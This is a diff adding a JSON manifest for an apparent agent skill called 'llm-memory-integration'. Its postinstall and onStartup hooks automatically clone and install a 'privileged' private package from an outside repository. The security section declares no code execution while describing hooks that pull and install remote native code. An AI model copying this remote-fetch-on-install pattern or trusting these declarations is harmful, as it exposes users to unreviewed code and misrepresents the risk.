@@ -1,0 +1,55 @@
+{
+  "name": "llm-memory-integration",
+  "version": "8.0.1",
+  "license": "MIT-0",
+  "author": "xkzs2007",
+  "homepage": "https://clawhub.ai/skill/llm-memory-integration",
+  "binaries": {
+    "required": ["python3", "git"],
+    "description": "Python 3 和 Git（钩子需要 git 克隆私有包）"
+  },
+  "pythonDependencies": {
+    "required": [],
+    "optional": [],
+    "description": "纯 Python + SQLite，无外部依赖"
+  },
+  "envVars": {
+    "required": [],
+    "optional": [],
+    "description": "无需环境变量"
+  },
+  "network": {
+    "required": true,
+    "endpoints": ["https://cnb.cool/llm-memory-integrat/llm"],
+    "description": "钩子需要网络访问 CNB 仓库克隆私有包"
+  },
+  "files": {
+    "read": ["~/.openclaw/memory-tdai/"],
+    "write": [
+      "~/.openclaw/memory-tdai/",
+      "~/.openclaw/workspace/skills/llm-memory-integration/src/privileged/"
+    ],
+    "description": "读写记忆数据库和私有包目录"
+  },
+  "security": {
+    "native_extensions": false,
+    "subprocess_calls": true,
+    "subprocess_description": "钩子会调用 git clone 命令",
+    "network_access": true,
+    "network_description": "钩子会访问 cnb.cool 下载私有包",
+    "system_reads": false,
+    "code_execution": false,
+    "description": "公开包本身无风险，但钩子会执行网络操作和 subprocess 调用"
+  },
+  "hooks": {
+    "postinstall": "hooks/postinstall.py",
+    "onStartup": "hooks/onStartup.py",
+    "description": "生命周期钩子，自动从 CNB 拉取私有包"
+  },
+  "privileged_package": {
+    "url": "https://cnb.cool/llm-memory-integrat/llm",
+    "description": "私有增强包，包含高性能实现、原生扩展、API 集成",
+    "architectures": ["x64", "arm64"],
+    "auto_install": true
+  }
+}
